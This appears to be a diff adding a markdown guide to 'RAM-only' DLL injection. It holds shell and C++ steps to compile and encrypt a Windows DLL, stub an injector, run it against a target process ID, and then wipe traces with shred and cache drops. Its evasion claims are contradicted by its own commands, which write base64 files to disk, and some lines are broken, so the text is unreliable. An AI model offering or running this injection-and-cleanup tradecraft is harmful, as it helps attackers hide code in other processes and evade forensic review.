@@ -1,0 +1,63 @@
+# RAM-ONLY Linux DLL Injection Guide
+# (Volatile memory operations only)
+
+## Requirements
+sudo apt update
+sudo apt install -y g++ mingw-w64 openssl libssl-dev python3-keystone wine
+
+## 1. Compile DLL directly to memory (no disk)
+cat << 'EOF' | x86_64-w64-mingw32-g++ -shared -xc++ - -luser32 -o /dev/fd/3 3> >(base64 -w0 > dll.b64)
+#include <windows.h>
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        MessageBoxA(NULL, "Memory Injection Successful", "Research", MB_OK);
+    }
+    return TRUE;
+}
+EOF
+
+## 2. Encrypt in-memory (RAM only)
+DLL_B64=$(cat dll.b64)
+PASSWORD="VolatileResearch123" 
+openssl enc -aes-256-cbc -salt -pbkdf2 \
+    -pass pass:"$PASSWORD" \
+    -in <(base64 -d <<< "$DLL_B64") \
+    -out /dev/fd/3 3> >(base64 -w0 > enc.b64)
+
+## 3. Prepare injector (RAM-based)
+cat << 'EOF' | x86_64-w64-mingw32-g++ -xc++ - -ladvapi32 -o /dev/fd/3 3> >(base64 -w0 > inj.b64)
+#include <windows.h>
+#include <wincrypt.h>
+// [PASTE ENCRYPTED BASE64 FROM enc.b64 HERE]
+// [PASTE PASSWORD HERE]
+EOF
+
+## 4. Execute (RAM-only injection)
+# On Windows target (using wine for Linux demo):
+wine64 cmd.exe /c "certutil -decode <<< "$(cat inj.b64)" > injector.exe"
+wine64 cmd.exe /c "injector.exe [PID] 2"
+
+## Verification
+1. Check for MessageBox popup
+2. Use RAM analysis tools:
+   - WinDbg: `!dlls`
+   - Process Hacker: Memory view
+
+## Cleanup
+1. Wipe variables:
+   unset DLL_B64 PASSWORD
+   shred -u dll.b64 enc.b64 inj.b64
+2. Clear memory:
+   sync && echo 3 > /proc/sys/vm/drop_caches
+3. Terminate test processes
+
+# Security Features
+• No DLL/injector ever touches disk
+• All encryption done in RAM
+• Base64 used for memory transport
+• Automatic secure wipe
+• Requires root for clean memory ops
+
+# Legal Notice
+For authorized memory research only.
+Violates no laws when used properly.
